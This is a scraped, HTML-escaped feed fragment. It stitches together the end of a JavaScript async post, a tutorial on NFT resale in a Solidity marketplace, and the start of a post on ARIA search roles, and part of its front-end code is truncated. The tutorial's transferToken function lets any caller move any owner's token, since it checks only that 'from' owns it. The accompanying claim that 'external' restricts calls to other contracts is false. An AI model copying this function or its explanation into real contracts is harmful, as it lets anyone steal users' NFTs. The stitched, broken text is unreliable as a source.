&lt;pre class="highlight javascript"&gt;&lt;code&gt;&lt;span class="nx"&gt;First&lt;/span&gt; &lt;span class="nx"&gt;log&lt;/span&gt;
&lt;span class="nx"&gt;Third&lt;/span&gt; &lt;span class="nx"&gt;log&lt;/span&gt;
&lt;span class="kc"&gt;undefined&lt;/span&gt;
&lt;span class="nx"&gt;Second&lt;/span&gt; &lt;span class="nx"&gt;log&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;As we can see, Third log does not wait for Second log to execute, the method of not waiting for the previous code to complete is called asynchronous.&lt;/p&gt;

&lt;h3&gt;
  &lt;a href="#when-we-need-asynchronous-"&gt;
  &lt;/a&gt;
  When we need asynchronous ?
&lt;/h3&gt;

&lt;p&gt;The best way to use asynchronous is when your website working with server to fetching data or getting response, instead of waiting all data from server fully loaded that maybe takes more than one minutes (depend on speed of your internet and server speed to resolve request) you could use asynchronous to make sure that code ahead will execute and javascript will not waiting server response to complete.&lt;/p&gt;

      <title>How to create a resell token functionality in your NFT marketplace smart contract</title>
      <author>Mateus Ferreira</author>
      <pubDate>Tue, 07 Dec 2021 21:59:58 +0000</pubDate>
      <link>https://dev.to/mateusasferreira/how-to-create-a-resell-token-functionality-in-your-nft-marketplace-smart-contract-ha</link>
      <guid>https://dev.to/mateusasferreira/how-to-create-a-resell-token-functionality-in-your-nft-marketplace-smart-contract-ha</guid>
      <description>&lt;p&gt;This article is intended to be a continuation of &lt;a class="mentioned-user" href="https://dev.to/dabit3"&gt;@dabit3&lt;/a&gt;
's great tutorial on how to create a &lt;a href="https://dev.to/dabit3/building-scalable-full-stack-apps-on-ethereum-with-polygon-2cfb"&gt;NFT Marketplace on Ethereum with Polygon&lt;/a&gt;. So, if you haven't started from there, I suggest you do. &lt;/p&gt;

&lt;p&gt;I'll be covering how to create a resell item feature to your marketplace, since this was an issue to me and to other developers to whom I have talked to. &lt;/p&gt;

&lt;p&gt;First, in the NFT contract, we'll add a function to transfer the token. You may be asking why I don't just simply use &lt;a href="https://docs.openzeppelin.com/contracts/2.x/api/token/erc721#IERC721-transferFrom-address-address-uint256-"&gt;ERC721's tranferFrom function&lt;/a&gt;. And the reason is that when I tested my functions, in some situations requests reverted with "transfer caller is not owner nor approved", even though msg.sender === ownerOf(tokenId) asserted true. So my solution was to write a custom transfer function. But feel free to share the solution for this strange bug in the comments if you know it. So this will be added to your NFT contract:&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight solidity"&gt;&lt;code&gt;&lt;span class="k"&gt;contract&lt;/span&gt; &lt;span class="n"&gt;NFT&lt;/span&gt; &lt;span class="k"&gt;is&lt;/span&gt; &lt;span class="n"&gt;ERC721URIStorage&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;

    &lt;span class="p"&gt;(...)&lt;/span&gt;

    &lt;span class="k"&gt;function&lt;/span&gt; &lt;span class="n"&gt;transferToken&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="kt"&gt;address&lt;/span&gt; &lt;span class="n"&gt;from&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="kt"&gt;address&lt;/span&gt; &lt;span class="n"&gt;to&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="kt"&gt;uint256&lt;/span&gt; &lt;span class="n"&gt;tokenId&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="k"&gt;external&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
        &lt;span class="nb"&gt;require&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;ownerOf&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;tokenId&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="o"&gt;==&lt;/span&gt; &lt;span class="n"&gt;from&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s"&gt;"From address must be token owner"&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
        &lt;span class="n"&gt;_transfer&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;from&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;to&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;tokenId&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
    &lt;span class="p"&gt;}&lt;/span&gt;

&lt;span class="p"&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;The "external" visibility allows only other smart contracts to call the function. And the "require" statement checks if the caller is the token's current owner. &lt;/p&gt;

&lt;p&gt;Now, in the MarketPlace contract, you have to import the NFT contract to call the function, and it will look like this:&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight solidity"&gt;&lt;code&gt;&lt;span class="k"&gt;import&lt;/span&gt; &lt;span class="s"&gt;"./NFT.sol"&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;The second change I made was to add a "creator" attribute to the MarketItem struct, so it won't lose the information about who first minted the token between transfers:&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight solidity"&gt;&lt;code&gt;&lt;span class="k"&gt;struct&lt;/span&gt; &lt;span class="n"&gt;MarketItem&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
        &lt;span class="kt"&gt;uint256&lt;/span&gt; &lt;span class="n"&gt;itemId&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
        &lt;span class="kt"&gt;address&lt;/span&gt; &lt;span class="n"&gt;nftContract&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
        &lt;span class="kt"&gt;uint256&lt;/span&gt; &lt;span class="n"&gt;tokenId&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
        &lt;span class="kt"&gt;address&lt;/span&gt; &lt;span class="k"&gt;payable&lt;/span&gt; &lt;span class="n"&gt;creator&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
        &lt;span class="kt"&gt;address&lt;/span&gt; &lt;span class="k"&gt;payable&lt;/span&gt; &lt;span class="n"&gt;seller&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
        &lt;span class="kt"&gt;address&lt;/span&gt; &lt;span class="k"&gt;payable&lt;/span&gt; &lt;span class="n"&gt;owner&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
        &lt;span class="kt"&gt;uint256&lt;/span&gt; &lt;span class="n"&gt;price&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
        &lt;span class="kt"&gt;bool&lt;/span&gt; &lt;span class="n"&gt;sold&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
    &lt;span class="p"&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;That means you'll have to alter your other existing functions and add this attribute too. I also created a new event, to broadcast that the token is being sold again:&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight solidity"&gt;&lt;code&gt;&lt;span class="k"&gt;event&lt;/span&gt; &lt;span class="n"&gt;ProductListed&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;
        &lt;span class="kt"&gt;uint256&lt;/span&gt; &lt;span class="k"&gt;indexed&lt;/span&gt; &lt;span class="n"&gt;itemId&lt;/span&gt;
    &lt;span class="p"&gt;);&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;Also, to write smaller functions and be able to reuse code, I created a &lt;a href="https://docs.soliditylang.org/en/v0.8.10/contracts.html#function-modifiers"&gt;modifier function&lt;/a&gt; to prevent that others than the contract owner do the operation:&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight solidity"&gt;&lt;code&gt;    &lt;span class="k"&gt;modifier&lt;/span&gt; &lt;span class="n"&gt;onlyItemOwner&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="kt"&gt;uint256&lt;/span&gt; &lt;span class="n"&gt;id&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
        &lt;span class="nb"&gt;require&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;
            &lt;span class="n"&gt;idToMarketItem&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;id&lt;/span&gt;&lt;span class="p"&gt;].&lt;/span&gt;&lt;span class="n"&gt;owner&lt;/span&gt; &lt;span class="o"&gt;==&lt;/span&gt; &lt;span class="n"&gt;msg&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;sender&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
            &lt;span class="s"&gt;"Only product owner can do this operation"&lt;/span&gt;
        &lt;span class="p"&gt;);&lt;/span&gt;
        &lt;span class="n"&gt;_&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
    &lt;span class="p"&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;And finally, the function to (re)list the token in the marketplace:&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight solidity"&gt;&lt;code&gt;&lt;span class="k"&gt;function&lt;/span&gt; &lt;span class="n"&gt;putItemToResell&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="kt"&gt;address&lt;/span&gt; &lt;span class="n"&gt;nftContract&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="kt"&gt;uint256&lt;/span&gt; &lt;span class="n"&gt;itemId&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="kt"&gt;uint256&lt;/span&gt; &lt;span class="n"&gt;newPrice&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
        &lt;span class="k"&gt;public&lt;/span&gt;
        &lt;span class="k"&gt;payable&lt;/span&gt;
        &lt;span class="n"&gt;nonReentrant&lt;/span&gt;
        &lt;span class="n"&gt;onlyItemOwner&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;itemId&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
    &lt;span class="p"&gt;{&lt;/span&gt;
        &lt;span class="kt"&gt;uint256&lt;/span&gt; &lt;span class="n"&gt;tokenId&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;idToMarketItem&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;itemId&lt;/span&gt;&lt;span class="p"&gt;].&lt;/span&gt;&lt;span class="n"&gt;tokenId&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
        &lt;span class="nb"&gt;require&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;newPrice&lt;/span&gt; &lt;span class="o"&gt;&amp;gt;&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s"&gt;"Price must be at least 1 wei"&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
        &lt;span class="nb"&gt;require&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;
            &lt;span class="n"&gt;msg&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;value&lt;/span&gt; &lt;span class="o"&gt;==&lt;/span&gt; &lt;span class="n"&gt;listingPrice&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
            &lt;span class="s"&gt;"Price must be equal to listing price"&lt;/span&gt;
        &lt;span class="p"&gt;);&lt;/span&gt;
        &lt;span class="c1"&gt;//instantiate a NFT contract object with the matching type
&lt;/span&gt;        &lt;span class="n"&gt;NFT&lt;/span&gt; &lt;span class="n"&gt;tokenContract&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;NFT&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;nftContract&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
        &lt;span class="c1"&gt;//call the custom transfer token method   
&lt;/span&gt;        &lt;span class="n"&gt;tokenContract&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;transferToken&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;msg&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;sender&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="kt"&gt;address&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nb"&gt;this&lt;/span&gt;&lt;span class="p"&gt;),&lt;/span&gt; &lt;span class="n"&gt;tokenId&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;

        &lt;span class="kt"&gt;address&lt;/span&gt; &lt;span class="n"&gt;oldOwner&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;idToMarketItem&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;itemId&lt;/span&gt;&lt;span class="p"&gt;].&lt;/span&gt;&lt;span class="n"&gt;owner&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
        &lt;span class="n"&gt;idToMarketItem&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;itemId&lt;/span&gt;&lt;span class="p"&gt;].&lt;/span&gt;&lt;span class="n"&gt;owner&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="k"&gt;payable&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="kt"&gt;address&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;));&lt;/span&gt;
        &lt;span class="n"&gt;idToMarketItem&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;itemId&lt;/span&gt;&lt;span class="p"&gt;].&lt;/span&gt;&lt;span class="n"&gt;seller&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;oldOwner&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
        &lt;span class="n"&gt;idToMarketItem&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;itemId&lt;/span&gt;&lt;span class="p"&gt;].&lt;/span&gt;&lt;span class="n"&gt;price&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;newPrice&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
        &lt;span class="n"&gt;idToMarketItem&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;itemId&lt;/span&gt;&lt;span class="p"&gt;].&lt;/span&gt;&lt;span class="n"&gt;sold&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nb"&gt;false&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
        &lt;span class="n"&gt;_itemsSold&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;decrement&lt;/span&gt;&lt;span class="p"&gt;();&lt;/span&gt;

        &lt;span class="k"&gt;emit&lt;/span&gt; &lt;span class="n"&gt;ProductListed&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;itemId&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
    &lt;span class="p"&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;For testing:&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight javascript"&gt;&lt;code&gt;&lt;span class="kd"&gt;const&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt; &lt;span class="nx"&gt;expect&lt;/span&gt; &lt;span class="p"&gt;}&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nx"&gt;require&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="dl"&gt;'&lt;/span&gt;&lt;span class="s1"&gt;chai&lt;/span&gt;&lt;span class="dl"&gt;'&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="kd"&gt;const&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt; &lt;span class="nx"&gt;ethers&lt;/span&gt; &lt;span class="p"&gt;}&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nx"&gt;require&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="dl"&gt;"&lt;/span&gt;&lt;span class="s2"&gt;hardhat&lt;/span&gt;&lt;span class="dl"&gt;"&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;

&lt;span class="kd"&gt;let&lt;/span&gt; &lt;span class="nx"&gt;market&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;span class="kd"&gt;let&lt;/span&gt; &lt;span class="nx"&gt;nft&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;span class="kd"&gt;let&lt;/span&gt; &lt;span class="nx"&gt;nftAddress&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;span class="kd"&gt;let&lt;/span&gt; &lt;span class="nx"&gt;marketAddress&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;

&lt;span class="nx"&gt;beforeEach&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="k"&gt;async&lt;/span&gt; &lt;span class="p"&gt;()&lt;/span&gt;&lt;span class="o"&gt;=&amp;gt;&lt;/span&gt;&lt;span class="p"&gt;{&lt;/span&gt;
    &lt;span class="kd"&gt;const&lt;/span&gt; &lt;span class="nx"&gt;Market&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="k"&gt;await&lt;/span&gt; &lt;span class="nx"&gt;ethers&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;getContractFactory&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="dl"&gt;"&lt;/span&gt;&lt;span class="s2"&gt;NFTMarket&lt;/span&gt;&lt;span class="dl"&gt;"&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
    &lt;span class="nx"&gt;market&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="k"&gt;await&lt;/span&gt; &lt;span class="nx"&gt;Market&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;deploy&lt;/span&gt;&lt;span class="p"&gt;();&lt;/span&gt;
    &lt;span class="k"&gt;await&lt;/span&gt; &lt;span class="nx"&gt;market&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;deployed&lt;/span&gt;&lt;span class="p"&gt;();&lt;/span&gt;

    &lt;span class="nx"&gt;marketAddress&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nx"&gt;market&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;address&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;

    &lt;span class="kd"&gt;const&lt;/span&gt; &lt;span class="nx"&gt;NFT&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="k"&gt;await&lt;/span&gt; &lt;span class="nx"&gt;ethers&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;getContractFactory&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="dl"&gt;"&lt;/span&gt;&lt;span class="s2"&gt;NFT&lt;/span&gt;&lt;span class="dl"&gt;"&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
    &lt;span class="nx"&gt;nft&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="k"&gt;await&lt;/span&gt; &lt;span class="nx"&gt;NFT&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;deploy&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;marketAddress&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;

    &lt;span class="nx"&gt;nftAddress&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nx"&gt;nft&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;address&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;span class="p"&gt;})&lt;/span&gt;

&lt;span class="nx"&gt;describe&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="dl"&gt;"&lt;/span&gt;&lt;span class="s2"&gt;Marketplace&lt;/span&gt;&lt;span class="dl"&gt;"&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="p"&gt;()&lt;/span&gt; &lt;span class="o"&gt;=&amp;gt;&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
   &lt;span class="p"&gt;(...)&lt;/span&gt;
    &lt;span class="nx"&gt;it&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="dl"&gt;"&lt;/span&gt;&lt;span class="s2"&gt;should allow buyer to resell an owned item&lt;/span&gt;&lt;span class="dl"&gt;"&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="k"&gt;async&lt;/span&gt; &lt;span class="p"&gt;()&lt;/span&gt; &lt;span class="o"&gt;=&amp;gt;&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;

    &lt;span class="kd"&gt;const&lt;/span&gt; &lt;span class="nx"&gt;listingPrice&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="k"&gt;await&lt;/span&gt; &lt;span class="nx"&gt;market&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;getListingPrice&lt;/span&gt;&lt;span class="p"&gt;();&lt;/span&gt;

    &lt;span class="k"&gt;await&lt;/span&gt; &lt;span class="nx"&gt;market&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;connect&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;creator&lt;/span&gt;&lt;span class="p"&gt;).&lt;/span&gt;&lt;span class="nx"&gt;createMarketItem&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;nftAddress&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;100&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;&lt;span class="na"&gt;value&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="nx"&gt;listingPrice&lt;/span&gt;&lt;span class="p"&gt;})&lt;/span&gt;

    &lt;span class="k"&gt;await&lt;/span&gt; &lt;span class="nx"&gt;market&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;connect&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;buyer&lt;/span&gt;&lt;span class="p"&gt;).&lt;/span&gt;&lt;span class="nx"&gt;createMarketSale&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;nftAddress&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;&lt;span class="na"&gt;value&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="mi"&gt;100&lt;/span&gt;&lt;span class="p"&gt;})&lt;/span&gt;

    &lt;span class="kd"&gt;const&lt;/span&gt; &lt;span class="nx"&gt;item&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="k"&gt;await&lt;/span&gt; &lt;span class="nx"&gt;market&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;fetchSingleItem&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;

  &lt;span class="p"&gt;})&lt;/span&gt;
&lt;span class="p"&gt;})&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;And in the front-end:&lt;br&gt;
&lt;/p&gt;

    &lt;span class="nx"&gt;Market&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;abi&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
    &lt;span class="nx"&gt;signer&lt;/span&gt;
  &lt;span class="p"&gt;);&lt;/span&gt;

  &lt;span class="kd"&gt;const&lt;/span&gt; &lt;span class="nx"&gt;listingPrice&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="k"&gt;await&lt;/span&gt; &lt;span class="nx"&gt;marketContract&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;getListingPrice&lt;/span&gt;&lt;span class="p"&gt;();&lt;/span&gt;

    &lt;span class="p"&gt;{&lt;/span&gt; &lt;span class="na"&gt;value&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="nx"&gt;listingPrice&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;toString&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt; &lt;span class="p"&gt;}&lt;/span&gt;
  &lt;span class="p"&gt;);&lt;/span&gt;
  &lt;span class="k"&gt;await&lt;/span&gt; &lt;span class="nx"&gt;tx&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;wait&lt;/span&gt;&lt;span class="p"&gt;();&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;I'm taking the signer as an argument here but you can also fetch it in your function as &lt;a class="mentioned-user" href="https://dev.to/dabit3"&gt;@dabit3&lt;/a&gt;
 did:&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight javascript"&gt;&lt;code&gt;&lt;span class="kd"&gt;const&lt;/span&gt; &lt;span class="nx"&gt;web3Modal&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="k"&gt;new&lt;/span&gt; &lt;span class="nx"&gt;Web3Modal&lt;/span&gt;&lt;span class="p"&gt;();&lt;/span&gt;
&lt;span class="kd"&gt;const&lt;/span&gt; &lt;span class="nx"&gt;connection&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="k"&gt;await&lt;/span&gt; &lt;span class="nx"&gt;web3Modal&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;connect&lt;/span&gt;&lt;span class="p"&gt;();&lt;/span&gt;
&lt;span class="kd"&gt;const&lt;/span&gt; &lt;span class="nx"&gt;provider&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="k"&gt;new&lt;/span&gt; &lt;span class="nx"&gt;ethers&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;providers&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;Web3Provider&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;connection&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
&lt;span class="kd"&gt;const&lt;/span&gt; &lt;span class="nx"&gt;signer&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nx"&gt;provider&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;getSigner&lt;/span&gt;&lt;span class="p"&gt;();&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;And this is how I handled this task. If you found a better solution, please share in the comments. Thank you!&lt;/p&gt;

  &lt;/a&gt;
  Help users with vision disabilities find a search
&lt;/h2&gt;

&lt;p&gt;Usually we know how to place a search for users without vision disabilities. But how should we do that for users with disabilities?&lt;/p&gt;

&lt;p&gt;There is a special search role in the WAI-ARIA standard that we should add for the form element. In this case screen readers will start to display search in the "Regions list" mode that is used by users for navigation.&lt;/p&gt;

&lt;p&gt;Pay attention, if we don't do that search will not be displayed in this mode. So it will hamper users start interaction with search. They will have to find a search using common keys. It's much longer than if they use the "Regions list" mode.&lt;/p&gt;

